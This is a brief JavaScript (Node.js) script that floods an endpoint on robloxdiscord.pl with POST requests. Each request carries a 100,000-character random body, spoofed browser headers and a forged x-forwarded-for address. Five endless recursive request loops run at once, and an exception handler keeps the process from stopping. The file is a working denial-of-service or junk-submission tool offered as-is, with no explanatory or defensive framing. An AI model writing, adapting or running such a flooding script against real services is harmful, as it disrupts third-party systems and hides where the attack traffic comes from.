import fetch from 'node-fetch'
import fs from 'fs'
process.on("uncaughtException", (err, origin) => {
  fs.writeSync(
    process.stderr.fd,
    `Caught exception: ${err}\n Exception origin: ${origin}`
  );
});
function makeid(length) {
        var result           = '';
        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * 
    charactersLength));
    }
    return result;
    }


function rawr(){
fetch("https://api-bytow.robloxdiscord.pl/egg", {
    "credentials": "omit",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "x-forwarded-for": "0.24.11.5"
    },
    "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
    "body": "num1="+makeid(100000)+"&captcha=",
    "method": "POST",
    "mode": "cors"
}).then(e=>{rawr()})
}
rawr()
rawr()
rawr()
rawr()
rawr()
